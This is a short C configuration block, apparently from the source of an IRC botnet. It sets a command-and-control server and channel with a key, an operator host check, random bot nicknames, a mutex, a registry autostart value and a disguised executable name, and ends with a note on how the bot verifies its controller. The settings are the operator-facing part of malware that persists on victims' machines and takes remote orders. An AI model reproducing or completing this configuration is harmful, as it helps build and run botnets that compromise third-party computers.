/************************************/
/************** CONFIG **************/
/************************************/

char dns[] = "irc.NITE.gov";		   // IRC Server DNS                //
char chan[] = "##NITE##";			   // IRC Channel					//
char chankey[] = "knight";			   // IRC Channel key				//
int port = 6667;					   // IRC Server port				//
char pass[] = "";					   // IRC Server Password			//
char host[] = "NITE.gov";			   // Host Required					//
int nl = 10;						   // Nick Length (Random Numbers)	//
char prefix[] = "N";				   // Nick Prefix					//
char mutex[] = "NITE";			       // Bot Mutex						//
char regk[] = "WinNite";			   // Registry Value				//
char exe[] = "WinNITE.exe";			   // EXE Name						//

/* NOTE: Wildcard is not used in host[]
		 All you need is the vhost, and
		 the bot will check if it matches.
		 You may do a full host, like:
		 host@host.com, but it is not required. */